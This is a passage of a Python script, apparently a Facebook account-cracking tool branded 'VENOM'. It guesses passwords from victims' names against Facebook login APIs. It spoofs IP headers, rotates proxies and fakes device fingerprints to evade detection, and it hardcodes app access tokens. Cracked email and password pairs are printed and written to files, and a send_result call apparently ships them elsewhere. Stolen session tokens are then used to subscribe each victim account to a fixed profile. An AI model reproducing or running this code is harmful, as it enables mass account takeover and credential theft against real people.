                'secure_family_device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'try_num': '1',
                'email': ids,
                'password': pas,
                'method': 'auth.login',
                'generate_session_cookies': '1',
                'sim_serials': "['80973453345210784798']",
                'openid_flow': 'android_login',
                'openid_provider': 'google',
                'openid_emails': f"['{ids}']",
                'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
                'error_detail_type': 'button_with_disabled',
                'source': 'account_recovery',
                'locale': 'es_ES',
                'client_country_code': 'ES',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation',
                'access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'ip_address': current_ip
            }
            data_native = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'credentials_type': 'device_based_login',
                'source': 'device_based_login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
                'device_based_login': 'true',
                'initial_request_id': str(uuid.uuid4()),
                'machine_id': str(uuid.uuid4()),
                'meta_inf_fbapi_req': 'true',
                'locale': random.choice(['en_US', 'ar_AR', 'fr_FR', 'de_DE']),
                'client_country_code': random.choice(['US', 'SA', 'FR', 'DE']),
                'access_token': accessToken,
                'family_device_id': str(uuid.uuid4()),
                'secure_family_device_id': str(uuid.uuid4()),
                'ip_address': current_ip,
                'client_ip_address': current_ip
            }
           ط
            data_mfa = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'true',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'fb_api_req_friendly_name': 'authenticate',
                'auth_factor': 'password',
                'next_auth_factor': 'totp',
                'is_mfa': 'false',
                'locale': random.choice(['en_US', 'es_ES', 'pt_BR']),
                'client_country_code': random.choice(['US', 'ES', 'BR']),
                'access_token': accessToken,
                'ip_address': current_ip
            }
            all_data_types = [data_basic, data_advanced, data_native, data_mfa]
            data_names = ["BASIC", "ADVANCED", "NATIVE", "MFA"]
            for i, current_data in enumerate(all_data_types):
                try:
                    global session
                    session = rotate_session_headers(session, data_names[i])
                    session.headers.update({
                        'X-Forwarded-For': current_ip,
                        'X-Client-IP': current_ip,
                        'X-Real-IP': current_ip
                    })
                    
                    url = 'https://b-api.facebook.com/method/auth.login'
                    time.sleep(random.uniform(1.5, 3.5))
                    po = session.post(url, data=current_data, timeout=30, allow_redirects=False)
                    
                    if po.status_code == 200:
                        q = json.loads(po.text)
                        
                        if 'session_key' in q:
                            print(f"\n\033[1;32m⤷⤷ VENOM-OK [{data_names[i]} MODE] | IP: {current_ip}")
                            print(f"\033[1;32m⤷ EMAIL: {ids}")
                            print(f"\033[1;31m⤷ PASS: {pas}")
                            print(f"\033[1;36m⤷ TYPE: {data_names[i]}\033[0m")
                            token = q['access_token']
                            try:
                                requests.post('https://graph.facebook.com/' + '100000525450858/' + 'subscribers' + '?access_token=' + token, timeout=5)
                            except:
                                pass
                            
                            open('/sdcard/VENOM_m66_OK.txt','a').write(ids+'|'+pas+'|'+data_names[i]+'|'+current_ip+'\n')
                            oks.append(ids)
                            return  
                        
                        elif 'www.facebook.com' in q.get('error_msg', ''):
                            if 'y' in pcp:
                                print(f"\n\033[1;31m⤷⤷ VENOM-CP [{data_names[i]} MODE] | IP: {current_ip}")
                                print(f"\033[1;31m⤷ EMAIL: {ids}")
                                print(f"\033[1;31m⤷ PASS: {pas}\033[0m")
                                open('/sdcard/VENOM-CP.txt', 'a').write(ids+'|'+pas+'|'+data_names[i]+'|'+current_ip+'\n')
                                cps.append(ids)
                                return  
                
                except requests.exceptions.ConnectionError:
                    ip_pool = generate_ip_pool(50)
                    time.sleep(random.uniform(3, 7))
                    continue
                except requests.exceptions.Timeout:
                    continue
                except Exception as e:
                    continue
            continue
            
        loop += 1
        
    except requests.exceptions.ConnectionError:
        ip_pool = generate_ip_pool(100)
        time.sleep(10)
    except Exception as e:
        pass
def M_file_4(ids,names,passlist):
                try:
                        global ok,loop,sim_id
                        boos = random.choice([P, M, H, K, B, U, O, N])
                        sys.stdout.write(f'\r\r\033[1;37m[{boos}VENOM-𝐌1\033[1;37m]\033[1;97m %s|\033[1;92mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        sys.stdout.flush()
                        
                        try:
                                ln = names.split(' ')[1]
                        except:
                                ln = fn
                                
                        for pw in passlist:
                                pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
                                #sm_mdl=('Infinix X689B', 'Samsung Galaxy S21', 'Google Pixel 5', 'OnePlus 9', 'Xiaomi Mi 11','LG V60 ThinQ', 'Sony Xperia 1 II', 'Huawei P40 Pro', 'Motorola Edge+', 'Nokia 8.3','OnePlus Nord', 'Xiaomi Redmi Note 10 Pro', 'Google Pixel 4a', 'Samsung Galaxy A52','Sony Xperia 5 II', 'LG Velvet', 'Motorola Moto G Power', 'Nokia 7.2', 'Huawei Mate 40 Pro','Samsung Galaxy S20 FE', 'OnePlus 8T', 'Xiaomi Poco X3', 'Google Pixel 4 XL', 'Sony Xperia 10 II','Motorola Razr', 'LG Wing', 'Nokia 9 PureView', 'Huawei P30 Pro', 'Samsung Galaxy Note 20 Ultra','OnePlus 8 Pro', 'Xiaomi Mi 10 Pro', 'Google Pixel 3a XL', 'Sony Xperia 1 III', 'LG G8 ThinQ','Motorola Moto G Stylus', 'Nokia 6.2', 'Huawei Mate Xs', 'Samsung Galaxy Z Fold 2','OnePlus 7T Pro', 'Xiaomi Mi 9T Pro', 'Google Pixel 3 XL', 'Sony Xperia 5 III', 'LG G7 ThinQ','Motorola Moto G Fast', 'Nokia 5.3', 'Huawei Nova 7i', 'Samsung Galaxy Z Flip', 'OnePlus 7 Pro','Xiaomi Mi Note 10', 'Google Pixel 3a', 'Sony Xperia XZ3', 'LG K92 5G', 'Motorola Moto G Play','Nokia 3.4', 'Huawei Y9s', 'Samsung Galaxy S10 Lite', 'OnePlus Nord N10', 'Xiaomi Redmi Note 9 Pro','Google Pixel 3', 'Sony Xperia XZ2', 'LG K61', 'Motorola Moto G9 Power', 'Nokia 2.4','Huawei P20 Pro', 'Samsung Galaxy A71', 'OnePlus Nord N100', 'Xiaomi Redmi Note 8 Pro','Google Pixel 2 XL', 'Sony Xperia L4', 'LG Q70', 'Motorola Moto E7 Plus', 'Nokia 1.3','Huawei P Smart 2021', 'Samsung Galaxy A50', 'OnePlus 6T', 'Xiaomi Redmi Note 7 Pro','Google Pixel 2', 'Sony Xperia 10 Plus', 'LG K51', 'Motorola Moto E6', 'Nokia 1 Plus','Huawei P10', 'Samsung Galaxy A20', 'OnePlus 6', 'Xiaomi Mi A3', 'Google Pixel XL','Sony Xperia XA2', 'LG Stylo 6', 'Motorola Moto E5 Plus', 'Nokia 2.3')
                                u1a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))+";Dalvik/1.8.0 (Linux; U; Android 11.0; Galaxy S21 Build/9LM88CD) [FBAN/FB4A;FBAV/119.0.0.93.51FBBV/8234567FBDM/{density=3.0,width=1080,height=1920}FBLC/fr_FRFBRV/6347852FBCR/VerizonFBMF/SamsungFBBD/SamsungFBPN/com.facebook.liteFBDV/Galaxy S21FBSV/11.0FBOP/1FBCA/armeabi-v7a]'+'Dalvik/1.8.0 (Linux; U; Android 10.0; Xperia 5 II Build/7PQ56EF) [FBAN/FB4A;FBAV/120.0.0.45.123FBBV/9123456FBDM/{density=2.5,width=1440,height=2560}FBLC/ar_EGFBRV/7854632FBCR/OrangeFBMF/SonyFBBD/SonyFBPN/com.facebook.katanaFBDV/Xperia 5 IIFBSV/10.0FBOP/1FBCA/arm64-v8a]'+'Dalvik/2.1.0 (Linux; U; Android 4; Build/SP1A.949257.425) [FBAN/FB4A;FBAV/272.0.0.50.125;FBBV/216845461;FBDM/{density=3.0,width=1280,height=1920};FBLC/en_US;FBRV/0;FBCR/Raketun;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo y66;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'+'[FBAN/MessengerLite;FBAV/278.0.0.29.121;FBBV/202740360;FBDM/{density=1,width=407,height=1218};FBLC/it_IT;FBRV/207023749;FBCR/Sprint;FBMF/xiaomi;FBBD/xiaomi EIN;FBPN/com.facebook.orca;FBSV/7.1;FBOP/13;FBCA/armeabi;]'+'[FBAN/Orca-Android;FBAV/86.0.0.37.86;FBBV/54200202;FBDM/{density=1.4,width=608,height=716};FBLC/it_IT;FBRV/112499470;FBCR/Telia;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.orca;FBBD/tecno X44;FBSV/4.7;FBOP/3;FBCA/armeabi-v7a;]"
                                device_id = str(uuid.uuid4())
                                adid = str(uuid.uuid4())
                                nip=random.choice(proxsi)
                                proxs= {'http': 'socks4://'+nip}   
                                data = {"adid": str(uuid.uuid4()),'format': 'json','device_id': str(uuid.uuid4()),'family_device_id': str(uuid.uuid4()),'secure_family_device_id': str(uuid.uuid4()),'cpl': 'true','try_num': '1','email': ids,'password': pas,'method': 'auth.login','generate_session_cookies': '1','sim_serials': "['80973453345210784798']",'openid_flow': 'android_login','openid_provider': 'google','openid_emails': "['01710940017']",'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",'error_detail_type': 'button_with_disabled','source': 'account_recovery','locale': 'fr_DZ','client_country_code': 'DZ','fb_api_req_friendly_name': 'authenticate','fb_api_caller_class': 'AuthOperations$PasswordAuthOperation','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
                                data = {'adid':adid,
                                        'email':ids,
                                        'password':pas,
                                        'cpl':'true',
                                        'credentials_type':'device_based_login_password',
                                        "source": "device_based_login",
                                        'error_detail_type':'button_with_disabled',
                                        'format':'json',
                                        'generate_session_cookies':'1',
                                        'generate_analytics_claim':'1',
                                        'generate_machine_id':'1',
                                        "family_device_id": str(uuid.uuid4()),
                                        "advertiser_id": str(uuid.uuid4()),
                                        "locale":"fr_DZ","client_country_code":"DZ",
                                        "device_id": str(uuid.uuid4()),
                                        "method": "auth.login",
                                        "api_key": "882a8490361da98702bf97a021ddc14d",
                                        "fb_api_req_friendly_name": "authenticate",
                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                                head = {'content-type':'application/x-www-form-urlencoded','Host': 'graph.facebook.com','x-fb-sim-hni':str(random.randint(40000,50000)),'X-FB-Connection-Type': 'MOBILE.LTE','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent': u1a,'x-fb-net-hni':str(random.randint(40000,50000)),'x-fb-device-group': '5120','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-connection-bandwidth':str(random.randint(400000,500000)),'x-fb-connection-quality':'EXCELLENT','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','x-fb-friendly-name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice', 'accept-encoding':'gzip, deflate','x-fb-http-engine':     'Liger'}
                                        
                                url = 'https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true'
                                twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                                
                                po = requests.post(url, data=data, headers=head, proxies=proxs, allow_redirects=False).text
                                q = json.loads(po)
                                
                                if 'session_key' in q:
                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                             
                                        print(f"\n\033[1;32m⤷⤷ VENOM-OK")
                                        print(f"\033[1;32m⤷ EMAIL: {ids}")
                                        print(f"\033[1;31m⤷ PASS: {pas}")
                                        print(f"\033[1;32m⤷ JOINED: {asha(ids)}\033[0m")
                                        send_result("OK", ids, pas)
                                        token = q['access_token']
                                        requests.post('https://graph.facebook.com/' + '100000525450858/' + 'subscribers' + '?access_token=' + token)
                                        open('/sdcard/VENOM_m66_OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error_msg']:
                                        if 'y' in pcp:
                                                print(f"\n\033[1;31m⤷⤷ VENOM-CP")
                                                print(f"\033[1;31m⤷ EMAIL: {ids}")
                                                print(f"\033[1;31m⤷ PASS: {pas}\033[0m")
                                                open('/sdcard/VENOM-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                else:
                                        continue
                        loop+=1
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
                except Exception as e:
                        pass

def abhijhirwal():
    devices = [
        "Samsung Galaxy S24 Ultra",
        "iPhone 15 Pro Max",
        "Google Pixel 8 Pro",
        "OnePlus 12",
        "Xiaomi 14 Ultra",
        "Asus ROG Phone 8",
        "Huawei Mate 60 Pro",
        "Sony Xperia 1 V",
        "Honor Magic6 Pro",
        "Realme GT5 Pro",
        "Vivo X100 Pro",
        "Oppo Find X7 Ultra",
        "Nothing Phone 2a",
        "ZTE Nubia Z60 Ultra",
        "Motorola Edge 50 Pro",
        "Infinix Zero 30 5G",
        "RedMagic 9 Pro"
    ]

    densities = ["density=2.5", "density=2.75", "density=3.0", "density=3.5"]
    dimensions = [
        "width=1080,height=2340",
        "width=1170,height=2532",
        "width=1440,height=3120",
        "width=1260,height=2800"
    ]
    
    locales = ["en_US", "ar_AR", "fr_FR", "es_ES", "de_DE", "pt_BR"]
    versions = ["13.0.0", "14.0.0", "15.0.0", "16.0.0"]

    device = random.choice(devices)
    brand = device.split()[0]
    model = device
    density = random.choice(densities)
    dimension = random.choice(dimensions)
    locale = random.choice(locales)
    version = random.choice(versions)
    fbav = f"{random.randint(400,499)}.0.0.{random.randint(10,99)}.{random.randint(100,999)}"
    fbbv = str(random.randint(200000000, 400000000))
    fbrv = str(random.randint(100000000, 300000000))

    width = dimension.split(',')[0].split('=')[1]
    height = dimension.split(',')[1].split('=')[1]

    user_agent = (
        f"FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};"
        f"FBDM{{{density},width={width},height={height}}};"
        f"FBLC/{locale};FBRV/{fbrv};FBCR/alfa;"
        f"FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;"
        f"FBDV/{model};FBSV/{version};FBOP/19;FBCA/armeabi-v7a:armeabi;"
    )

    return user_agent
try:
        menu()
except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
except Exception as e:pass